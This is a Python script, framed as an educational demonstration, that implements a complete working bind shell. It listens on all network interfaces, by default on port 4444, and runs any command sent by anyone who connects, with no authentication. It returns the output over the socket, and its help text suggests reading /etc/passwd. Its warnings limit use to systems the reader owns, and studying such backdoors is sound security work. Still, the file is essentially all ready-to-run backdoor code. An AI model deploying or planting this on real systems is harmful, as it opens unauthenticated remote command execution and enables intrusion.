#!/usr/bin/env python3
"""
Bind Shell Example - Educational demonstration of backdoor concepts

WARNING: This is for educational purposes only. Never run this on systems
you don't own or without explicit permission.

A bind shell listens on a port and provides command execution to anyone
who connects. This helps you understand:
- How backdoors work
- Network security testing
- Why firewalls block incoming connections

Usage: python bind_shell.py [port]
"""

import socket
import subprocess
import threading
import sys
import os

class BindShell:
    def __init__(self, port=4444):
        self.port = port
        self.server = None
        
    def start_server(self):
        """
        Start the bind shell server
        """
        try:
            # Create server socket
            self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            
            # Allow reuse of address (prevents "Address already in use" error)
            self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            
            # Bind to all interfaces on specified port
            self.server.bind(('0.0.0.0', self.port))
            
            # Listen for connections (max 1 pending connection)
            self.server.listen(1)
            
            print(f"[*] Bind shell listening on port {self.port}")
            print(f"[*] Connect with: nc {self.get_local_ip()} {self.port}")
            print(f"[*] Press Ctrl+C to stop")
            
            while True:
                # Accept incoming connection
                client, addr = self.server.accept()
                print(f"[+] Connection received from {addr[0]}:{addr[1]}")
                
                # Handle client in separate thread
                client_thread = threading.Thread(
                    target=self.handle_client, 
                    args=(client, addr)
                )
                client_thread.daemon = True
                client_thread.start()
                
        except KeyboardInterrupt:
            print("\n[*] Shutting down bind shell...")
        except Exception as e:
            print(f"[!] Server error: {e}")
        finally:
            if self.server:
                self.server.close()
    
    def handle_client(self, client, addr):
        """
        Handle individual client connections
        
        Args:
            client: Client socket object
            addr: Client address tuple
        """
        try:
            # Send welcome banner
            banner = f"Educational Bind Shell\nConnected to {socket.gethostname()}\n"
            banner += f"Type 'exit' to disconnect\n"
            banner += "shell> "
            client.send(banner.encode())
            
            while True:
                # Receive command from client
                command = client.recv(1024).decode().strip()
                
                if not command:
                    break
                    
                if command.lower() == 'exit':
                    client.send(b"Goodbye!\n")
                    break
                    
                # Handle special commands
                if command.lower() == 'help':
                    help_text = self.get_help_text()
                    client.send(help_text.encode())
                    client.send(b"shell> ")
                    continue
                
                # Execute command and send output
                try:
                    # Execute command in shell
                    result = subprocess.run(
                        command,
                        shell=True,
                        capture_output=True,
                        text=True,
                        timeout=30  # 30 second timeout
                    )
                    
                    # Send stdout
                    if result.stdout:
                        client.send(result.stdout.encode())
                    
                    # Send stderr
                    if result.stderr:
                        client.send(f"ERROR: {result.stderr}".encode())
                    
                    # Send return code if non-zero
                    if result.returncode != 0:
                        client.send(f"Exit code: {result.returncode}\n".encode())
                        
                except subprocess.TimeoutExpired:
                    client.send(b"Command timed out\n")
                except Exception as e:
                    client.send(f"Command execution failed: {e}\n".encode())
                
                # Send prompt for next command
                client.send(b"shell> ")
                
        except Exception as e:
            print(f"[!] Client handler error: {e}")
        finally:
            client.close()
            print(f"[-] Connection from {addr[0]}:{addr[1]} closed")
    
    def get_local_ip(self):
        """Get local IP address for display purposes"""
        try:
            # Connect to a remote address to determine local IP
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            return local_ip
        except:
            return "127.0.0.1"
    
    def get_help_text(self):
        """Return help information"""
        help_text = """
Available commands:
- Any system command (ls, ps, whoami, etc.)
- help: Show this help message
- exit: Close connection

Examples:
- whoami
- pwd
- ls -la
- ps aux
- cat /etc/passwd

"""
        return help_text

def main():
    """Main function"""
    # Parse command line arguments
    port = 4444  # Default port
    
    if len(sys.argv) > 1:
        try:
            port = int(sys.argv[1])
        except ValueError:
            print("Error: Port must be a number")
            sys.exit(1)
    
    # Check if port is in valid range
    if not (1 <= port <= 65535):
        print("Error: Port must be between 1 and 65535")
        sys.exit(1)
    
    # Warning message
    print("=" * 60)
    print("EDUCATIONAL BIND SHELL")
    print("=" * 60)
    print("WARNING: This creates a backdoor on your system!")
    print("Only use on systems you own or have permission to test.")
    print("=" * 60)
    
    # Create and start bind shell
    bind_shell = BindShell(port)
    bind_shell.start_server()

if __name__ == "__main__":
    main()